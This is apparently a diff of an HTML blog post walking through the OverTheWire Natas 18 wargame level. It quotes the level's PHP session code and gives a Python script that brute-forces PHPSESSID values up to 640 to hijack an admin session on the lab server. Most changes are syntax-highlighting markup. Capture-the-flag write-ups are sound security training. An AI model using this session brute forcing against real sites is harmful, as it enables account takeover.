+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;maxid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;640&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// 640 should be enough for everyone&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Then we have a function that checks whether a variable &lt;em&gt;$id&lt;/em&gt; is a number with the PHP function &lt;a href="http://php.net/manual/en/function.is-numeric.php"&gt;is_numeric&lt;/a&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;isValidID&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="cm"&gt;/* {{{ */&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;isValidID&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="cm"&gt;/* {{{ */&lt;/span&gt;
     &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;is_numeric&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$id&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Then we have this main object:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$showform = true;
-if(my_session_start()) {
-    print_credentials();
-    $showform = false;
-} else {
-    if(array_key_exists(&amp;quot;username&amp;quot;, $_REQUEST) &amp;amp;&amp;amp; array_key_exists(&amp;quot;password&amp;quot;, $_REQUEST)) {
-    session_id(createID($_REQUEST[&amp;quot;username&amp;quot;]));
-    session_start();
-    $_SESSION[&amp;quot;admin&amp;quot;] = isValidAdminLogin();
-    debug(&amp;quot;New session started&amp;quot;);
-    $showform = false;
-    print_credentials();
-    }
-}
-if($showform) {
-?&amp;gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;showform&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nt"&gt;true&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+&lt;span class="nt"&gt;if&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;my_session_start&lt;/span&gt;&lt;span class="o"&gt;())&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;print_credentials&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+    &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;showform&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="nt"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;_REQUEST&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;_REQUEST&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;createID&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;_REQUEST&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+    &lt;span class="n"&gt;session_start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+    &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;_SESSION&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;isValidAdminLogin&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+    &lt;span class="n"&gt;debug&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;New session started&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;showform&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="n"&gt;print_credentials&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="err"&gt;}&lt;/span&gt;
+&lt;span class="nt"&gt;if&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;showform&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;span class="o"&gt;?&amp;gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;The next function create an random id number with the value defined by &lt;em&gt;$maxid&lt;/em&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;function createID($user) { /* {{{ */&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="x"&gt;function createID($user) { /* {{{ */&lt;/span&gt;
 &lt;span class="x"&gt;    global $maxid;&lt;/span&gt;
 &lt;span class="x"&gt;    return rand(1, $maxid);&lt;/span&gt;
 &lt;span class="x"&gt;}&lt;/span&gt;
@@ -894,8 +892,8 @@ if($showform) {
 
 
 &lt;p&gt;This checks whether the function &lt;em&gt;my_session_start()&lt;/em&gt; is true:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;my_session_start() {&lt;/span&gt; &lt;span class="cm"&gt;/* {{{ */&lt;/span&gt;
-    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;PHPSESSID&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="nx"&gt;and&lt;/span&gt; &lt;span class="nx"&gt;isValidID&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;PHPSESSID&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;my_session_start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="cm"&gt;/* {{{ */&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;PHPSESSID&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="nx"&gt;and&lt;/span&gt; &lt;span class="nx"&gt;isValidID&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$_COOKIE&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;PHPSESSID&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
     &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;session_start&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
         &lt;span class="nx"&gt;debug&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Session start failed&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
         &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
@@ -903,7 +901,7 @@ if($showform) {
         &lt;span class="nx"&gt;debug&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Session start ok&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
         &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
         &lt;span class="nx"&gt;debug&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Session was old: admin flag set&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-        &lt;span class="nx"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// backwards compatible, secure&lt;/span&gt;
+        &lt;span class="nx"&gt;$_SESSION&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// backwards compatible, secure&lt;/span&gt;
         &lt;span class="p"&gt;}&lt;/span&gt;
         &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
     &lt;span class="p"&gt;}&lt;/span&gt;
@@ -914,21 +912,21 @@ if($showform) {
 
 
 &lt;p&gt;In the case it's true, a function that prints the credentials is called, printing our password:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;print_credentials() {&lt;/span&gt; &lt;span class="cm"&gt;/* {{{ */&lt;/span&gt;
-    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$_SESSION&lt;/span&gt; &lt;span class="nx"&gt;and&lt;/span&gt; &lt;span class="nx"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="nx"&gt;and&lt;/span&gt; &lt;span class="nx"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-    &lt;span class="nx"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;You are an admin. The credentials for the next level are:&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="nx"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;pre&amp;gt;Username: natas19\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="nx"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Password: &amp;lt;censored&amp;gt;&amp;lt;/pre&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-    &lt;span class="nx"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="p"&gt;}&lt;/span&gt;
-&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nx"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;print_credentials&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="cm"&gt;/* {{{ */&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SESSION&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="nx"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; == 1) {
+    print &amp;quot;You are an admin. The credentials for the next level are:&lt;span class="nt"&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&amp;quot;;
+    print &amp;quot;&lt;span class="nt"&gt;&amp;lt;pre&amp;gt;&lt;/span&gt;Username: natas19\n&amp;quot;;
+    print &amp;quot;Password: &lt;span class="nt"&gt;&amp;lt;censored&amp;gt;&amp;lt;/pre&amp;gt;&lt;/span&gt;&amp;quot;;
+    } else {
+    print &amp;quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.&amp;quot;;
+    }
+}
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;If &lt;em&gt;%my_session&lt;/em&gt; is not true, it  will look to the HTTP request and search for username and password. If it finds them, it creates a session id:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;isValidAdminLogin() {&lt;/span&gt; &lt;span class="cm"&gt;/* {{{ */&lt;/span&gt;
-    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;isValidAdminLogin&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="cm"&gt;/* {{{ */&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$_REQUEST&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
     &lt;span class="cm"&gt;/* This method of authentication appears to be unsafe and has been disabled for now. */&lt;/span&gt;
         &lt;span class="c1"&gt;//return 1;&lt;/span&gt;
     &lt;span class="p"&gt;}&lt;/span&gt;
@@ -943,22 +941,22 @@ if($showform) {
 &lt;p&gt;The variable &lt;a href="http://php.net/manual/en/reserved.variables.request.php"&gt;$_REQUEST&lt;/a&gt;  is an  array that by default contains the contents of &lt;em&gt;$_GET&lt;/em&gt;, &lt;em&gt;$_POST&lt;/em&gt; and &lt;em&gt;$_COOKIE&lt;/em&gt;.&lt;/p&gt;
 &lt;h4&gt;Crafting the attack:&lt;/h4&gt;
 &lt;p&gt;We write the following script:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
 
 &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;brute_force_password&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PAYLOAD&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;MAXID&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
     &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;MAXID&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-        &lt;span class="n"&gt;HEADER&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Cookie&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;PHPSESSID=&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)}&lt;/span&gt;
+        &lt;span class="n"&gt;HEADER&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;Cookie&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;PHPSESSID=&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)}&lt;/span&gt;
         &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;auth&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;PAYLOAD&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;HEADER&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;You are an admin&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;You are an admin&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
             &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
             &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
             &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
 
-&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-    &lt;span class="n"&gt;AUTH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;natas18&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;*************************&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="n"&gt;URL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://natas18.natas.labs.overthewire.org/index.php?&amp;#39;&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;AUTH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;natas18&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;*************************&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;URL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;http://natas18.natas.labs.overthewire.org/index.php?&amp;#39;&lt;/span&gt;
 
-    &lt;span class="n"&gt;PAYLOAD&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
+    &lt;span class="n"&gt;PAYLOAD&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
     &lt;span class="n"&gt;MAXID&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;640&lt;/span&gt;
 
     &lt;span class="n"&gt;brute_force_password&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PAYLOAD&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;MAXID&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
@@ -971,10 +969,10 @@ if($showform) {
 &lt;blockquote&gt;
 &lt;p&gt;This page uses mostly the same code as the previous level, but session IDs are no longer sequential...&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/OQ7LATt.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/OQ7LATt.png" /&gt;&lt;/p&gt;
